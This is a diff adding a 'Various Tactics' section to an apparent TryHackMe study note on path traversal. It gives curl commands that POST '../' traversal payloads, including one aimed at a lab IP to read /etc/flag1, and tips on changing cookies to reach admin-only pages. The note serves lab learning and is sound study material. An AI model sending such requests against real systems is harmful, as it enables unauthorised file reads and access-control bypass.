@@ -23,4 +23,24 @@ The ../ notation moves the program from the current directory into its' parent d
 >[!note]
 > It's entirely possible that you'll encounter a filtration system that combines multiple filtration methods. Don't give up after trying the basics- design your path traversals to defeat combinations of multiple filtration methods if necessary!
 
+# Various Tactics:
+### POST Request:
+Generic form:
+`curl http://<ip-addr>/dir/to/file.php --data-raw 'file=../../../../../directory/file.extension'
+
+Example from THM: 
+`curl http://10.10.194.104/challenges/chall1.php --data-raw 'file=../../../../../etc/flag1'`
+
+You can also Inspect Element on a page, then change forms from GET requests to POST requests to achieve a similar effect. The `curl` example seems easier to replicate, though. 
+
+### Cookies:
+Sometimes websites use cookies to authenticate. Thus, users without the admin cookies can't see webpages that could be vulnerable. 
+
+Generic form:
+`curl http://<ip-addr>/dir/to/file.php --cookie "Cookie1=Value1; Cookie2=Value2" --data-raw 'file=../../../../directory/file.extension'
+
+You can also edit and resend HTTP requests from the developer tools (Inspect Element) window, which allows you to change the cookies and accomplish what you need to. 
+
+
+
 For futher research, see TryHackMe's File Inclusion room in the Intro To Web Hacking module of the Junior Pentesting Path. 
